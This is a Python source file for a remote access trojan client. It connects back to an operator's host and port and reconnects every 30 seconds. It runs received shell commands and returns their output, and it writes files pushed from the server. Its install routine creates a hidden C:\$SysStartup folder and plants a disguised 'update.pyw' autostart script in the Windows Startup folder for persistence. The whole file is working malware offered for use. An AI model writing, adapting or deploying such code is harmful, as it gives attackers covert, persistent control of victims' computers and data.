import socket as s
from subprocess import check_output, call
from time import sleep
from sys import exit
from random import randint
from os import getlogin, chdir, getcwd
import threading
import pathlib

# change this to your ip and port:
HOST = ""
PORT = 420
# -----------------------------------------
BUFFER = 4096
FORMAT = "cp850"
ADDR = (HOST, PORT)

# the script for autostart
var = """import threading
from subprocess import call
def a0001(): call(["python", "C:\$SysStartup\pslib.py"], shell=True)
a0001 = threading.Thread(target=a0001)
a0001.start()

"""
path = (pathlib.Path(__file__).parent.absolute())
chdir(path)
global client


# tries to reconnect after 30 secconds
def connector():
    try:
        global client
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect(ADDR)
        recvMsg()
    except (ConnectionRefusedError, TimeoutError, OSError):
        print("retrying in 30 secs")
        sleep(30)
        connector()


def sendMsg(msg):
    sendLength = str(len(msg)).encode(FORMAT)
    client.send(sendLength)
    client.send(msg.encode(FORMAT))
    recvMsg()


# processes the commands if sent
def process(message):
    ctype = message[0]
    # if console command is sent
    if ctype == "c":
        messageLst = message.split(" ")
        mode = messageLst[1]
        messageLst.pop(0)
        messageLst.pop(0)

        # return the command output
        def comm():
            return check_output(messageLst, shell=True).decode(FORMAT)

        # doesent return the output
        def tComm():
            call(messageLst, shell=True)

        # checks if the command neds an output to be sent
        if mode == "o":
            sendMsg(comm())
        else:
            threads = threading.Thread(target=tComm)
            threads.start()
            recvMsg()
    # accepts a sent file
    elif ctype == "f":
        # checks what type of file and what mode it uses
        msgNoType = message[1:]
        mode = msgNoType[4]
        msg = message[5:]
        fType = msgNoType[0:3].replace(' ', '')
        # generates the name of the file
        name = f"a{randint(100, 900)}.{fType}"
        # writes the file
        with open(f"{name}", "w") as fileObj:
            fileObj.write(msg)
        # checks if the script is only temporarry
        if mode == "A":
            # checks if the  the script is installes and returns an error if not
            if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
                call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
                    if fType == "py" or "pyw":
                        obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
                        obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
                        obj.write(f'b{name[0:4]}.start()')
                sendMsg(name)
            else:
                call(["remove", name])
                sendMsg("err")
        else:
            call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
            sendMsg(name)
    # installation procedure
    elif ctype == "x":
        # creates the needed folders
        call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
        message = message[1:]
        # creates the shell script and moves it
        with open("pslib.pyw", "a") as libFile:
            libFile.write(message)
        call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
        # creates the autostart scirpt
        with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "w") as updateFile:
            updateFile.write(var)
        recvMsg()
    else:
        # disconnects
        if message == "!dsc":
            client.close()
            exit()


# receivs the commands
def recvMsg():
    try:
        # gets the length
        msgLen = client.recv(BUFFER).decode(FORMAT)
        if msgLen and not "":
            msgLen = int(msgLen)
            msg = client.recv(int(msgLen)).decode(FORMAT)
            process(msg)
    # returns to connector func if the connection is lost
    except (TimeoutError, ConnectionResetError):
        sleep(30)
        connector()


connector()
